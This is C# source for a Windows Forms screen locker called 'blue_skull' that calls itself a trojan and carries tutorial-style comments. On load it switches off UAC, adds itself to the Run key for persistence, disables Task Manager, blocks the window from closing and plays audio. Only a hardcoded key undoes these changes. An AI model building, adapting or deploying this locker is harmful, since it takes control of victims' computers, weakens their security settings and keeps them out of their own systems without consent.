using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Media; //please add
using Microsoft.Win32; //please add
using System.Diagnostics; //please add
using System.Runtime.InteropServices;

namespace blue_skull
{
    public partial class blue_skull2 : Form
    {
     


        private SoundPlayer _soundplayer; //defines music
        public blue_skull2()
        {
            InitializeComponent();
            _soundplayer = new SoundPlayer("C:\\norm9.wav"); //path for music(must be .wav)
        }

        private void blue_skull2_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true; //Anti close
        }

        private void blue_skull2_Load(object sender, EventArgs e)
        {




            timer1.Start();
            _soundplayer.Play(); //Turn on music
            //the same registry settings as in the first section
            RegistryKey rk = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);

            RegistryKey rg = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rg.SetValue("EnableLUA", 0, RegistryValueKind.DWord);

            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            reg.SetValue("blue_skull", Application.ExecutablePath.ToString());

            RegistryKey fk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            fk.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);

        }



        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click_1(object sender, EventArgs e)
        {

            //condition for the button

            if (textBox1.Text == "") //if the user does not fill in anything
            {
                MessageBox.Show("Incorrect key", "WRONG KEY", MessageBoxButtons.OK, MessageBoxIcon.Error); //command

            }
            else if (textBox1.Text == "672349276") //if it writes the correct code
            {
                //commands for setting the registry in the default settings and the program shuts down at the end

                ProcessStartInfo kokot = new ProcessStartInfo();
                kokot.FileName = "cmd.exe";
                kokot.WindowStyle = ProcessWindowStyle.Hidden;
                kokot.Arguments = @"/k start explorer.exe";
                Process.Start(kokot);

                MessageBox.Show("The key is correct", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Information);
                RegistryKey rk = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                rk.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);

                RegistryKey key = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                key.SetValue("EnableLUA", 1, RegistryValueKind.DWord);

                RegistryKey fk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                fk.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);

                RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                reg.SetValue("blue_skull", 0, RegistryValueKind.String);
                Process[] _proceses = null;
                _proceses = Process.GetProcessesByName("Trojan_Locker");
                foreach (Process proces in _proceses)
                {
                    proces.Kill();
                }
                this.Close();
            }
            else //if it writes the wrong code
            {
                MessageBox.Show("Incorrect key", "WRONG KEY", MessageBoxButtons.OK, MessageBoxIcon.Error); //command
            }

        }

        

        private void timer1_Tick(object sender, EventArgs e)
        {
            
        }

    }
}
